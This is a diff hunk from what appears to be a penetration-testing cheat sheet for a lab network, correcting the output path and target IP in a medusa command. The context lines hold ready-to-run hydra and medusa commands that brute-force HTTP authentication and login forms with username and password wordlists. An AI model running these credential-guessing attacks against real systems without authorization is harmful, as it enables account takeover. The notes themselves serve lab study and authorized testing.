@@ -55,7 +55,7 @@ dnsrecon -d DOMAIN.COM
  `hydra -L "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e nsr -s 8080 -o "/root/Desktop/tcp_8080_http_auth_hydra.txt" http-get://10.11.1.2/path/to/auth/area` <br/><br/>
  `hydra -L "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e nsr -s 8080 -o "/root/Desktop/scans/tcp_8080_http_form_hydra.txt" http-post-form://10.11.1.2/path/to/login.php:username=^USER^&password=^PASS^:invalid-login-message`<br/><br/>
   `medusa -U "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e ns -n 8080 -O "/root/Desktop/tcp_8080_http_auth_medusa.txt" -M http -h 10.11.1.2 -m DIR:/path/to/auth/area`<br/><br/>
-  `medusa -U "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e ns -n 8080 -O "/root/Desktop/10.11.1.2/scans/tcp_8080_http_form_medusa.txt" -M web-form -h 10.11.1.209 -m FORM:/path/to/login.php -m FORM-DATA:"post?username=&password=" -m DENY-SIGNAL:"invalid login message"`
+  `medusa -U "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e ns -n 8080 -O "/root/Desktop/tcp_8080_http_form_medusa.txt" -M web-form -h 10.11.1.2 -m FORM:/path/to/login.php -m FORM-DATA:"post?username=&password=" -m DENY-SIGNAL:"invalid login message"`
 
  
 * high degree of manual inspection
